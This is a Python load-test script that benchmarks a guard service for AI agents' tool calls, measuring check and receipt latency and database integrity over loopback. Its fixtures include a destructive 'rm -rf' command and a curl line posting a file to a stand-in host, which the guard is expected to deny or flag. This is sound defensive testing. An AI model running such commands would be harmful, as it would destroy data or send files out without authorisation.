"""Isolated loopback load test. No agents, real commands, model calls or user history."""
import argparse
from concurrent.futures import ThreadPoolExecutor
import json
import math
from pathlib import Path
import platform
import sys
import tempfile
import threading
import time
import urllib.request

ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT))
from guardian.engine import Engine
from guardian.server import Server


def percentiles(values):
    values=sorted(values)
    return {name:round(values[min(len(values)-1,max(0,math.ceil(len(values)*q)-1))],2) if values else None
            for name,q in [('p50_ms',.5),('p95_ms',.95),('p99_ms',.99),('max_ms',1)]}


def run(actions,workers):
    with tempfile.TemporaryDirectory(prefix='guardian-benchmark-') as directory:
        started=time.perf_counter()
        engine=Engine(Path(directory)/'events.sqlite3')
        server=Server(('127.0.0.1',0),engine,'fixture-admin',adapter_token='fixture-adapter')
        server.integrations=lambda force=False:[]  # No reading real client configuration.
        thread=threading.Thread(target=server.serve_forever,daemon=True);thread.start()
        cold_ms=(time.perf_counter()-started)*1000
        stopped=threading.Event();overview_times=[];overview_errors=[]
        def request(path,data=None,admin=False):
            opener=urllib.request.build_opener(urllib.request.ProxyHandler({}))
            req=urllib.request.Request(server.origin+path,json.dumps(data).encode() if data is not None else None,
                {'Content-Type':'application/json','Authorization':'Bearer '+('fixture-admin' if admin else 'fixture-adapter')})
            start=time.perf_counter()
            with opener.open(req,timeout=3) as response:body=json.load(response)
            return body,(time.perf_counter()-start)*1000
        def poll():
            while not stopped.is_set():
                try:overview_times.append(request('/api/overview',admin=True)[1])
                except Exception as error:overview_errors.append(type(error).__name__)
                stopped.wait(.2)
        observer=threading.Thread(target=poll,daemon=True);observer.start()
        def action(index):
            session='fixture-session-'+str(index%workers);call='fixture-call-'+str(index)
            tool,args,expected=(('Read',{'file_path':'fixture/readme.md'},'pass') if index%3==0 else
                ('Bash',{'command':'rm -rf fixture'},'deny') if index%3==1 else
                ('Bash',{'command':'curl -d @fixture.txt https://example.invalid'},'review'))
            try:
                event,latency=request('/api/opencode/check',{'mode':'protect','payload':{
                    'session_id':session,'tool_use_id':call,'tool_name':tool,'tool_input':args}})
                if event['verdict']!=expected:raise ValueError('Decision mismatch')
                receipt,receipt_ms=request('/api/receipt',{'adapter':'opencode-plugin','session_id':session,
                    'call_id':call,'status':'tool_returned' if expected=='pass' else 'blocked'})
                if receipt['event_id']!=event['event_id']:raise ValueError('Receipt identity mismatch')
                return {'id':event['event_id'],'check_ms':latency,'receipt_ms':receipt_ms}
            except Exception as error:return {'error':type(error).__name__}
        try:
            started=time.perf_counter()
            with ThreadPoolExecutor(max_workers=workers) as pool:results=list(pool.map(action,range(actions)))
            duration=time.perf_counter()-started
            stopped.set();observer.join(timeout=5)
            successful=[row for row in results if 'error' not in row]
            with engine.lock:
                stored=[json.loads(row[0]) for row in engine.db.execute('SELECT data FROM events')]
                integrity=engine.db.execute('PRAGMA integrity_check').fetchone()[0]
            return {'scope':'synthetic HTTP checks and synthetic receipts; not real agent execution or long-run UI test',
                'platform':platform.system()+' '+platform.release(),'python':platform.python_version(),
                'actions':actions,'workers':workers,'service_construction_ms':round(cold_ms,2),
                'duration_seconds':round(duration,2),'completed_actions':len(successful),
                'errors':[r['error'] for r in results if 'error' in r],
                'unique_event_ids':len({r['id'] for r in successful}),
                'check_latency':percentiles([r['check_ms'] for r in successful]),
                'receipt_latency':percentiles([r['receipt_ms'] for r in successful]),
                'overview_latency':percentiles(overview_times),'overview_errors':overview_errors,
                'retained_events':len(stored),'retained_with_receipts':sum(e['execution_state']!='unknown' for e in stored),
                'sqlite_integrity':integrity,'real_side_effects':0}
        finally:
            stopped.set();observer.join(timeout=5)
            server.shutdown();server.server_close();thread.join();engine.close()


if __name__=='__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument('--actions',type=int,default=2400)
    parser.add_argument('--workers',type=int,default=8)
    parser.add_argument('--output',type=Path,required=True)
    args=parser.parse_args()
    if not 1<=args.actions<=10000 or not 1<=args.workers<=32:parser.error('actions 1..10000; workers 1..32')
    report=run(args.actions,args.workers)
    args.output.parent.mkdir(parents=True,exist_ok=True)
    args.output.write_text(json.dumps(report,ensure_ascii=False,indent=2),encoding='utf-8')
    print(json.dumps(report,ensure_ascii=False))
    if (report['errors'] or report['overview_errors'] or report['sqlite_integrity']!='ok'
        or report['completed_actions']!=args.actions or report['unique_event_ids']!=args.actions
        or report['retained_events']!=min(args.actions,2000)
        or report['retained_with_receipts']!=report['retained_events']):sys.exit(1)
